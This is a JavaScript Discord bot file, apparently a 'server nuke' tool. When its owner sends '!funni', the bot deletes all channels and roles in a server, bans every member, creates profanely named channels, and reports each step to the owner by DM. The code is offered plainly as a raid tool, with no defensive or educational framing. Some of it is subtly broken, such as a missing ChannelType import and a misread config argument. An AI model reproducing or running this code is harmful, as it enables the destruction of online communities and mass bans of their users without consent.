const { Client, GatewayIntentBits } = require("discord.js");
const colors = require("colors");

const config = require("./config.js");
const authToken = config.Client.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
  ],

  presence: {
    activites: [
      {
        name: "toomfolery",
        type: 2,
      },
    ],
    status: "online",
  },
});

require("http")
  .createServer((req, res) => res.end("Ready."))
  .listen(4000);

client.on("messageCreate", async (message, config) => {
  const ownerID = config.Users.OWNERID;
  if (message.author.id != ownerID) return;
  if (!message.content.toLowerCase().startsWith("!funni")) return;

  message.author.send(
    "**[START]** Starting raid on " + `**${message.guild.name}**`
  );

  message.guild.channels.cache.forEach((channel) => {
    var namey = channel.name.toUpperCase();
    channel.delete().catch((err) => {
      console.log(err);
      return;
    });
    message.author.send("[SUCCESS] Deleted channel " + `**${namey}**`);
  });

  message.guild.roles.cache.forEach((role) => {
    var namey = role.name.toUpperCase();
    role.delete().catch((err) => {
      console.log(err);
      return;
    });
    message.author.send("[SUCCESS] Deleted role " + `**${namey}**`);
  });

  message.guild.members.cache.forEach((member) => {
    var tag = member.user.tag;
    message.guild.channels.create({
      name: "fucked",
      type: ChannelType.GuildText,
    });
    member.ban({ reason: "Server Nuked" }).catch((err) => {
      console.log(err);
      return;
    });
    message.author.send("[SUCCESS] Banned member " + `**${tag}**`);
  });
  console.log("Nuked a server!" + " " + message.guild.name);
});

client.login(authToken).catch((err) => {
  console.error(err);
  return process.exit();
});

process.on("unhandledRejection", async (err, promise) => {
  console.error(`[ANTI-CRASH] Unhandled Rejection: ${err}`.red);
  console.error(promise);
});
